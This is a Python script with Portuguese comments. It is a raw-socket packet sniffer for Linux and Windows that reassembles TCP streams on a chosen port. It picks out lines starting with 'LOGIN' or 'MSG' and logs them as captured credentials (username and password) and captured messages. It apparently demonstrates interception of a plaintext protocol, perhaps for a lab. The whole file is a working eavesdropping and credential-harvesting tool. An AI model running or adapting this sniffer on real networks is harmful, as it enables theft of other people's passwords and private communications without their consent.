
import socket
import struct
import sys
from datetime import datetime

IFACE = sys.argv[1] if len(sys.argv) > 1 else ("127.0.0.1" if sys.platform == "win32" else "eth0")
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5000

ETH_HEADER_LEN = 14
ETH_P_IPV4 = 0x0800
SIO_RCVALL = 0x98000001
RCVALL_ON = 1
RCVALL_OFF = 0
# Buffers de remontagem por conexao (chave: (ip_origem, porta_origem, ip_destino, porta_destino))
stream_buffers = {}


def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


def parse_ethernet(packet):
    dest_mac, src_mac, eth_proto = struct.unpack("!6s6sH", packet[:ETH_HEADER_LEN])
    return eth_proto, packet[ETH_HEADER_LEN:]


def parse_ip(packet):
    version_ihl = packet[0]
    ihl = (version_ihl & 0x0F) * 4
    proto = packet[9]
    src_ip = socket.inet_ntoa(packet[12:16])
    dst_ip = socket.inet_ntoa(packet[16:20])
    return proto, src_ip, dst_ip, ihl, packet[ihl:]


def parse_tcp(packet):
    src_port, dst_port, seq, ack, offset_flags = struct.unpack("!HHLLH", packet[:14])
    data_offset = (offset_flags >> 12) * 4
    payload = packet[data_offset:]
    return src_port, dst_port, payload


def open_capture_socket():
    """Abre captura raw usando a API nativa da plataforma."""
    if sys.platform == "win32":
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        raw_sock.bind((IFACE, 0))
        raw_sock.ioctl(SIO_RCVALL, RCVALL_ON)
        return raw_sock, False

    raw_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    raw_sock.bind((IFACE, 0))
    return raw_sock, True


def close_capture_socket(raw_sock, has_ethernet_header):
    if sys.platform == "win32" and not has_ethernet_header:
        try:
            raw_sock.ioctl(SIO_RCVALL, RCVALL_OFF)
        except OSError:
            pass
    raw_sock.close()


def process_payload(key, payload):
    """Acumula bytes recebidos por conexao e extrai linhas completas."""
    if not payload:
        return
    buf = stream_buffers.get(key, b"") + payload
    while b"\n" in buf:
        line, buf = buf.split(b"\n", 1)
        handle_line(key, line.decode("utf-8", errors="replace"))
    stream_buffers[key] = buf


def handle_line(key, line):
    src_ip, src_port, dst_ip, dst_port = key
    origem = f"{src_ip}:{src_port} -> {dst_ip}:{dst_port}"
    line = line.strip()
    if not line:
        return

    if line.upper().startswith("LOGIN "):
        parts = line.split(" ")
        if len(parts) >= 3:
            usuario, senha = parts[1], parts[2]
            log(f"[{origem}] *** CREDENCIAIS CAPTURADAS *** usuario='{usuario}' senha='{senha}'")
        else:
            log(f"[{origem}] LOGIN (formato inesperado): {line}")
    elif line.upper().startswith("MSG "):
        texto = line[4:]
        log(f"[{origem}] *** MENSAGEM CAPTURADA *** '{texto}'")
    else:
        log(f"[{origem}] payload: {line}")


def main():
    try:
        raw_sock, has_ethernet_header = open_capture_socket()
    except PermissionError:
        if sys.platform == "win32":
            print("ERRO: execute o PowerShell como Administrador para capturar pacotes.")
        else:
            print("ERRO: este sniffer precisa ser executado como root (sudo).")
        sys.exit(1)
    except OSError as e:
        print(f"ERRO ao abrir socket raw na interface '{IFACE}': {e}")
        if sys.platform == "win32":
            print("Dica: no Windows, informe o IP da interface observadora.")
        else:
            print("Dica: confirme o nome da interface com 'ip link'.")
        sys.exit(1)

    log(f"Sniffer iniciado na interface '{IFACE}', filtrando porta {TARGET_PORT}")
    log("Aguardando trafego do protocolo alvo... (Ctrl+C para parar)")

    try:
        while True:
            raw_packet, _ = raw_sock.recvfrom(65535)

            if has_ethernet_header:
                eth_proto, ip_packet = parse_ethernet(raw_packet)
                if eth_proto != ETH_P_IPV4:
                    continue
            else:
                ip_packet = raw_packet

            proto, src_ip, dst_ip, ihl, tcp_segment = parse_ip(ip_packet)
            if proto != 6:  # 6 = TCP
                continue

            src_port, dst_port, payload = parse_tcp(tcp_segment)

            if src_port != TARGET_PORT and dst_port != TARGET_PORT:
                continue

            key = (src_ip, src_port, dst_ip, dst_port)
            process_payload(key, payload)
    finally:
        close_capture_socket(raw_sock, has_ethernet_header)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("Sniffer encerrado pelo usuario.")
